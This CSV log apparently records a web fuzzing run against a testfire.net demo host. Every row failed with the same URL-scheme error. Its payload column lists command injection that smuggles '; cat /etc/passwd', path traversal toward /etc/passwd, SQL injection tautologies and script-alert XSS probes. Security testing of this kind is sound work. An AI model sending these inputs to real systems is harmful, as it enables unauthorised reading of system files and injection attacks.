payload,reflected,error
; cat /etc/passwd #182,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #150,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #69,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 35=35 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(48)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 75=75 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #159,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #179,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(141)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #48,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 112=112 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(96)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #36,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 47=47 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #4,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(117)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 82=82 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #19,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 191=191 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #60,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 110=110 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #67,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #138,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 10=10 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(29)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(6)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 166=166 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
